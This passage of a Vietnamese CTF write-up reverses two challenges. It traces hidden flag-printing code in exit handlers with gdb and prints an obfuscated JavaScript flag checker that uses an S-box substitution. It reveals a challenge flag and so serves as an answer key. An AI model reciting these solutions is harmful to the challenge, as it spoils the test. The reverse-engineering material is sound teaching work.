<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                                                                                           <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> .<span style="color:#f92672">/</span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels                                                                                                                                            <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">?????</span> 
</span></span></code></pre></div><p>Ồ, mặc nhiên hàm <code>main</code> chỉ <code>xor eax, eax; ret</code> mà lại có thể in ra được các kí tự <code>đặc biệt</code> như này, mình lấy làm lạ.
Mình nghi ngờ là ở hàm <code>start</code> hoặc <code>exit</code> khi chương trình bắt đầu hoặc kết thúc có những đoạn code ẩn để in các kí tự này</p>
<p>Để chắc chắn, mình dùng <code>gdb</code> để debug và đặt <code>breakpoint</code> ở ret để kiểm tra</p>
<pre tabindex="0"><code>► 0x401626 &lt;main+6&gt;                        ret                                  &lt;0x401b8a; __libc_start_call_main+106&gt;
    ↓
   0x401b8a &lt;__libc_start_call_main+106&gt;    mov    edi, eax
</code></pre><p>Mình đã tới được <code>ret</code> và chưa có gì được in ra, mình lần theo hàm <code>exit</code> để xem thứ gì xảy ra. Và mình đã phát hiện được 1 thứ đặc biệt</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">►</span>  <span style="color:#ae81ff">0x40a7f0</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">&gt;</span>       movabs rax, <span style="color:#ae81ff">0x101010101010101</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a7fa</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>    push   rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a7fb</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>    movabs rax, <span style="color:#ae81ff">0x1010b3e3e3e3e3e</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a805</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>    xor    qword ptr [rsp], rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a809</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>    mov    rsi, rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80c</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80e</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>    pop    rdi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80f</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a811</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>    pop    rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a812</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a814</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>    pop    rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a815</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">37</span><span style="color:#f92672">&gt;</span>    syscall
</span></span></code></pre></div><p>Ở trong hàm <code>__run_exit_handlers</code> thật sự đã dùng các chỉ thị để in ra chuỗi kí tự <code>????</code>, mình tiếp tục theo hàm này để xem có chuyện gì xảy ra</p>
<p>-&gt; Cuối cùng, mình thấy hàm dùng 1 vòng lặp để thực hiện các phép toán và cứ giảm stack cho đến khi đầy đủ kí tự flag và tiếp tục kiểm tra trên stack thì mình thấy các kí tự của flag, sau đó chương trình gọi syscall exit để kết thúc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> rsp <span style="color:#ae81ff">0x7fffffffdd00</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x747375637b3157b0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffdd08</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0</span>m_r0ut1n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffdd10</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffdd18</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x7d</span> <span style="color:#75715e">/* &#39;}&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span> rsi <span style="color:#ae81ff">0x7fffffffdd20</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xa3f3f3f3f3f</span> <span style="color:#75715e">/* &#39;?????\n&#39; */</span>
</span></span></code></pre></div><p>Get flag !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> search <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> value: <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>[stack]         <span style="color:#ae81ff">0x7fffffffdd01</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{cust0m_r0ut1n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{cust0m_r0ut1n3s_w0w!}</code></p>
<h3 id="4-pu-pu-flag-checker">4. Pu Pu flag checker</h3>
<p><code>Description: I thought it really easy.</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/flagchecker.html">flagchecker.html</a></p>
<pre tabindex="0"><code>Welcome to Pu Pu Flag checker
 
Input your flag, ex: W1{You_suck}     [Confirm]
</code></pre><p>-&gt; Chương trình cho ta 1 file html, dường như là trang để check flag cổ điển, mình view source để xem chương trình chứa gì, thì thấy 1 dòng chứa những đoạn code có vẻ quen thuộc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#a6e22e">function</span>(_0x21262b,_0x48fc44){<span style="color:#66d9ef">const</span> _0x3d9bc6<span style="color:#f92672">=</span>_0x17ea,_0x1bc71f<span style="color:#f92672">=</span><span style="color:#a6e22e">_0x21262b</span>();<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!!</span>[]){try{<span style="color:#66d9ef">const</span> _0x101b0c<span style="color:#f92672">=</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x92</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x1</span><span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x89</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x2</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8d</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x3</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x87</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">*</span>(<span style="color:#f92672">-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8f</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x5</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x94</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x6</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x84</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x7</span><span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8e</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span><span style="color:#f92672">*</span>(<span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x90</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x9</span>);<span style="color:#66d9ef">if</span>(_0x101b0c<span style="color:#f92672">===</span>_0x48fc44)<span style="color:#66d9ef">break</span>;<span style="color:#66d9ef">else</span> _0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>push<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>shift<span style="color:#960050;background-color:#1e0010">&#39;</span>]());}<span style="color:#a6e22e">catch</span>(_0x20c5ae){_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>push<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x1bc71f[<span style="color:#960050;background-color:#1e0010">&#39;</span>shift<span style="color:#960050;background-color:#1e0010">&#39;</span>]());}}}(_0x16be,<span style="color:#ae81ff">0xedeb9</span>));function <span style="color:#a6e22e">getRandomInt</span>(_0x35fac5,_0x501f88){<span style="color:#66d9ef">const</span> _0x4edb8c<span style="color:#f92672">=</span>_0x17ea;<span style="color:#66d9ef">return</span> Math[<span style="color:#a6e22e">_0x4edb8c</span>(<span style="color:#ae81ff">0x8a</span>)](Math[<span style="color:#a6e22e">_0x4edb8c</span>(<span style="color:#ae81ff">0x96</span>)]()<span style="color:#f92672">*</span>(_0x501f88<span style="color:#f92672">-</span>_0x35fac5<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1</span>))<span style="color:#f92672">+</span>_0x35fac5;}function <span style="color:#a6e22e">byteArrayToBase64</span>(_0x458f88){<span style="color:#66d9ef">const</span> _0x2bd1a7<span style="color:#f92672">=</span>_0x17ea;let _0x148301<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>;<span style="color:#66d9ef">for</span>(let _0x5a2524<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x5a2524<span style="color:#f92672">&lt;</span>_0x458f88[<span style="color:#a6e22e">_0x2bd1a7</span>(<span style="color:#ae81ff">0x8b</span>)];_0x5a2524<span style="color:#f92672">++</span>){_0x148301<span style="color:#f92672">+=</span>String[<span style="color:#a6e22e">_0x2bd1a7</span>(<span style="color:#ae81ff">0x95</span>)](_0x458f88[_0x5a2524]);}<span style="color:#66d9ef">const</span> _0x123abd<span style="color:#f92672">=</span><span style="color:#a6e22e">btoa</span>(_0x148301);<span style="color:#66d9ef">return</span> _0x123abd;}function <span style="color:#a6e22e">_0x17ea</span>(_0x1ef9b6,_0x14509b){<span style="color:#66d9ef">const</span> _0x16be78<span style="color:#f92672">=</span><span style="color:#a6e22e">_0x16be</span>();<span style="color:#66d9ef">return</span> _0x17ea<span style="color:#f92672">=</span><span style="color:#a6e22e">function</span>(_0x17eabc,_0x5afbf3){_0x17eabc<span style="color:#f92672">=</span>_0x17eabc<span style="color:#f92672">-</span><span style="color:#ae81ff">0x84</span>;let _0xe824bb<span style="color:#f92672">=</span>_0x16be78[_0x17eabc];<span style="color:#66d9ef">return</span> _0xe824bb;},<span style="color:#a6e22e">_0x17ea</span>(_0x1ef9b6,_0x14509b);}function <span style="color:#a6e22e">xorStrings</span>(_0x5601ff,_0x11ecad){<span style="color:#66d9ef">const</span> _0x403f41<span style="color:#f92672">=</span>_0x17ea;let _0x3822c6<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>;<span style="color:#66d9ef">for</span>(let _0x304d5b<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x304d5b<span style="color:#f92672">&lt;</span>_0x5601ff[<span style="color:#960050;background-color:#1e0010">&#39;</span>length<span style="color:#960050;background-color:#1e0010">&#39;</span>]<span style="color:#f92672">&amp;&amp;</span>_0x304d5b<span style="color:#f92672">&lt;</span>_0x11ecad[<span style="color:#a6e22e">_0x403f41</span>(<span style="color:#ae81ff">0x8b</span>)];_0x304d5b<span style="color:#f92672">++</span>){<span style="color:#66d9ef">const</span> _0x1a8e54<span style="color:#f92672">=</span>_0x5601ff[<span style="color:#960050;background-color:#1e0010">&#39;</span>charCodeAt<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x304d5b),_0x51cc58<span style="color:#f92672">=</span>_0x11ecad[<span style="color:#960050;background-color:#1e0010">&#39;</span>charCodeAt<span style="color:#960050;background-color:#1e0010">&#39;</span>](_0x304d5b),_0x1d436b<span style="color:#f92672">=</span>_0x1a8e54<span style="color:#f92672">^</span>_0x51cc58;_0x3822c6<span style="color:#f92672">+=</span>String[<span style="color:#a6e22e">_0x403f41</span>(<span style="color:#ae81ff">0x95</span>)](_0x1d436b);}<span style="color:#66d9ef">return</span> _0x3822c6;}function <span style="color:#a6e22e">check</span>(_0x3b37a2){<span style="color:#66d9ef">const</span> _0x452468<span style="color:#f92672">=</span>_0x17ea;var _0x41bc91<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0xf2</span>,<span style="color:#ae81ff">0x6b</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0xfe</span>,<span style="color:#ae81ff">0xd7</span>,<span style="color:#ae81ff">0xab</span>,<span style="color:#ae81ff">0x76</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x7d</span>,<span style="color:#ae81ff">0xfa</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0xd4</span>,<span style="color:#ae81ff">0xa2</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x9c</span>,<span style="color:#ae81ff">0xa4</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x26</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x3f</span>,<span style="color:#ae81ff">0xf7</span>,<span style="color:#ae81ff">0xcc</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0xa5</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0xd8</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0x4</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0xc3</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x5</span>,<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0x7</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xeb</span>,<span style="color:#ae81ff">0x27</span>,<span style="color:#ae81ff">0xb2</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x9</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0xb3</span>,<span style="color:#ae81ff">0x29</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x5b</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0xcf</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0xaa</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0x43</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0xf9</span>,<span style="color:#ae81ff">0x2</span>,<span style="color:#ae81ff">0x7f</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0x92</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0xbc</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xf3</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0xc</span>,<span style="color:#ae81ff">0x13</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x3d</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x19</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x4f</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0xb</span>,<span style="color:#ae81ff">0xdb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x32</span>,<span style="color:#ae81ff">0x3a</span>,<span style="color:#ae81ff">0xa</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x6</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0xc2</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0xe7</span>,<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x37</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0xea</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x7a</span>,<span style="color:#ae81ff">0xae</span>,<span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0x2e</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0xc6</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x1f</span>,<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0xb5</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xe</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0xb9</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0xe1</span>,<span style="color:#ae81ff">0xf8</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0x1e</span>,<span style="color:#ae81ff">0x87</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x8c</span>,<span style="color:#ae81ff">0xa1</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xd</span>,<span style="color:#ae81ff">0xbf</span>,<span style="color:#ae81ff">0xe6</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0xb0</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x16</span>];<span style="color:#66d9ef">if</span>(_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)]<span style="color:#f92672">!=</span><span style="color:#ae81ff">0x2c</span>)<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>Incorrect<span style="color:#960050;background-color:#1e0010">\</span>x20length<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">&#39;</span>);var _0x2884dc<span style="color:#f92672">=</span>[];<span style="color:#66d9ef">for</span>(let _0x1a57d6<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x1a57d6<span style="color:#f92672">&lt;</span>_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)];_0x1a57d6<span style="color:#f92672">++</span>){_0x2884dc[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x91</span>)](_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x85</span>)](_0x1a57d6));}<span style="color:#66d9ef">for</span>(let _0xfc20f8<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0xfc20f8<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10</span>;_0xfc20f8<span style="color:#f92672">++</span>){<span style="color:#66d9ef">for</span>(let _0x4fadbc<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x4fadbc<span style="color:#f92672">&lt;</span>_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)];_0x4fadbc<span style="color:#f92672">++</span>){_0x2884dc[_0x4fadbc]<span style="color:#f92672">=</span>_0x41bc91[_0x2884dc[_0x4fadbc]];}}var _0x45d93e<span style="color:#f92672">=</span><span style="color:#a6e22e">byteArrayToBase64</span>(_0x2884dc);console[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x86</span>)](_0x45d93e);<span style="color:#66d9ef">if</span>(_0x45d93e<span style="color:#f92672">!=</span><span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x88</span>))<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x93</span>));<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8c</span>));}function <span 